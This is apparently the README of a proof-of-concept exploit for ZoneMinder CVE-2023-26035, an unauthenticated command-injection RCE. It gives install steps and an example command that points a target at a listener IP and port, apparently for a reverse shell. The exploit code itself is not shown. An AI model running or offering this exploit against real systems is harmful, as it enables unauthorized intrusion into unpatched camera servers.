# Zoneminder Unauthenticated RCE via Snapshots (CVE-2023-26035) POC

This is a script written in Python that allows the exploitation of the **Zoneminder's** security flaw in the described in **CVE 2023-26035**. The system is vulnerable in versions preceding **1.36.33** and **1.37.33.**

## Usage

Clone the repository to your machine and install the dependencies using **pip** (it is recommended to use **virtualenv** to create an environment to separate these installations from global installations)

```bash
git clone https://github.com/m3m0o/zoneminder-snapshots-rce-poc
cd zoneminder-snapshots-rce-poc
pip install -r requirements.txt
```

The script needs the **target URL** with the **Zoneminder's** root path (like **http://example.com/zm, http://example.com** or **http://example.com/zoneminder)**, the **IP** or **domain** for the target machine to connect and the **port** for the target machine to connect. Here's an example:

```bash
python3 main.py -u http://zoneminder.target:8000 -i 10.10.14.56 -p 443
```

![script-demo](https://iili.io/Ju3w7t9.gif)

## References

[Unauthenticated RCE in snapshots](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr)

[Rapid7 Vulnerability & Exploit Database ZoneMinder Snapshots Command Injection](https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/)
